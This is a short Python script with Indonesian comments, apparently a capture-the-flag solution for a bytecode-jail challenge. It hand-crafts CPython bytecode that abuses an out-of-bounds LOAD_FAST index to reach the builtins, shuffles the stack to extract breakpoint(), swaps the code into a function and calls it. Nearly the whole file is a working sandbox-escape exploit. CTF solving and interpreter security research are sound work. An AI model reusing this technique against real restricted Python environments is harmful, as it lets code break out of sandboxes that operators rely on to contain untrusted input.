from dis import opmap, dis
# https://docs.python.org/3.12/library/dis.html#python-bytecode-instructions
# Ini ada OOB di LOAD_FAST cuma dia beda tiap program?????
# Kalo di challenge file dia ada di index 42 ('*')
BUILTINS_INDEX = 40

LOAD_FAST = opmap['LOAD_FAST']
RETURN_VALUE = opmap['RETURN_VALUE']
UNPACK_EX = b'^x'               # UNPACK_EX atau star (*x) basically *x trus unpacked valuesnya ada 120 ord('x')
SWAP_STACK = b'cy'              # Swap stack[-121] dengan TOS
POP = b'#;Y;Y;'                 # POP
BUILD_TUPLE = b'fx'             # Make a 120 sized tuple
DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
print(LOAD_FAST, RETURN_VALUE)
def f():
    pass

# Magically get builtins
code = bytes([
    LOAD_FAST, BUILTINS_INDEX,
    LOAD_FAST, BUILTINS_INDEX,
])
 
code += UNPACK_EX + SWAP_STACK + POP + BUILD_TUPLE + DUMP_TO_STACK

# Swap breakpoint
code += bytes([
    *b'c', 109
])

# Return function breakpoint
code += bytes([
    RETURN_VALUE, 59
])

print(len(code))
f.__code__ = f.__code__.replace(co_names=(), co_code=code)
print(f.__code__.co_code)
f()()